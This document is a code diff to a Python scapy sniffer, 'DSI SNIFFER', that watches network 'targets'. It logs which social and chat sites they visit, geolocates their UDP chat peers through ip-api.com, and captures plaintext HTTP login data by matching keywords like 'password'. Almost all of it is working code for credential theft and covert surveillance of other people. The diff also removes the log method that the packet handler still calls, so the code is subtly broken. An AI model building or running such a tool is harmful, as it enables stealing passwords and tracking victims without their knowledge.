@@ -5,8 +5,10 @@ import threading
 import time
 import os
 
+import requests
+
 # ==============================================================
-# DSI SNIFFER - GRÃO-MESTRE SUPREMO (Deep Packet Inspection)
+# DSI SNIFFER - GRÃO-MESTRE SUPREMO (DPI & GEOLOCALIZAÇÃO)
 # ==============================================================
 
 class DSISniffer:
@@ -15,51 +17,61 @@ class DSISniffer:
         self.log_callback = log_callback
         self.is_running = False
         self.sniff_thread = None
+        self.geo_cache = {}
         
-        # Filtros de interesse (Redes Sociais e Senhas)
+        # Filtros de interesse
         self.social_domains = [
             "facebook.com", "instagram.com", "twitter.com", "x.com", 
             "linkedin.com", "tiktok.com", "snapchat.com", "whatsapp.com",
-            "gmail.com", "google.com", "netflix.com"
+            "messenger.com", "telegram.org"
         ]
         
-        # Regex para capturar credenciais em texto claro (HTTP/Form Data)
-        self.cred_keywords = [
-            "user", "username", "login", "email", "pass", "password", 
-            "key", "auth", "token", "session"
-        ]
+        self.cred_keywords = ["user", "username", "login", "email", "pass", "password"]
 
-    def log(self, msg, log_type="info"):
-        if self.log_callback:
-            self.log_callback(msg, log_type)
-        else:
-            print(f"[*] {msg}")
+    def get_location(self, ip):
+        if ip in self.geo_cache: return self.geo_cache[ip]
+        try:
+            # Consulta API Expert de Geolocalização
+            r = requests.get(f"http://ip-api.com/json/{ip}", timeout=2)
+            data = r.json()
+            if data['status'] == 'success':
+                loc = f"{data['city']} ({data['country']})"
+                self.geo_cache[ip] = loc
+                return loc
+        except: pass
+        return "Nuvem/CDN"
 
     def process_packet(self, packet):
-        # 1. Identifica Redes Sociais via DNS ou HTTP Host
+        # 1. Identificação de Redes Sociais e Chat
         if packet.haslayer(scapy.DNSQR):
             qname = packet[scapy.DNSQR].qname.decode('utf-8').lower()
             for domain in self.social_domains:
                 if domain in qname:
                     src_ip = packet[scapy.IP].src
-                    self.log(f"[SOCIAL RADAR] Alvo {src_ip} acessando: {domain}", log_type="info")
+                    self.log(f"[SOCIAL] Alvo {src_ip} via {domain}", log_type="info")
                     break
 
-        # 2. Identifica Credenciais em pacotes HTTP
-        if packet.haslayer(http.HTTPRequest):
-            url = packet[http.HTTPRequest].Host.decode() + packet[http.HTTPRequest].Path.decode()
-            method = packet[http.HTTPRequest].Method.decode()
+        # 2. Intercepção de Tráfego P2P/Chat (Identificação de Origem Remota)
+        # Muitos chats usam STUN/UDP para chamadas ou transferências
+        if packet.haslayer(scapy.UDP) and packet.haslayer(scapy.IP):
             src_ip = packet[scapy.IP].src
-            
-            # Registra a navegação
-            self.log(f"[HTTP {method}] {src_ip} -> {url}", log_type="info")
+            dst_ip = packet[scapy.IP].dst
+            # Se a porta for alta (típico de apps de chat), tentamos geolocalizar
+            if packet[scapy.UDP].sport > 10000 or packet[scapy.UDP].dport > 10000:
+                # Evita IPs locais
+                if not dst_ip.startswith("192.168.") and not dst_ip.startswith("10."):
+                    location = self.get_location(dst_ip)
+                    if location != "Nuvem/CDN":
+                        self.log(f"[GEOLOCALIZAÇÃO] Mensagem/Fluxo recebido de: {location} [IP: {dst_ip}]", log_type="info")
 
+        # 3. Credenciais HTTP
+        if packet.haslayer(http.HTTPRequest):
+            src_ip = packet[scapy.IP].src
             if packet.haslayer(scapy.Raw):
                 load = packet[scapy.Raw].load.decode(errors='ignore').lower()
                 for key in self.cred_keywords:
                     if key in load:
-                        # Alerta Vermelho: Possível Credencial Detectada
-                        self.log(f"!!! [ALERTA CREDENCIAL] Alvo: {src_ip} | Dados: {load[:200]}...", log_type="error")
+                        self.log(f"!!! [CREDENTIAL FOUND] Alvo: {src_ip} | Dados: {load[:100]}", log_type="error")
                         break
 
     def start(self):
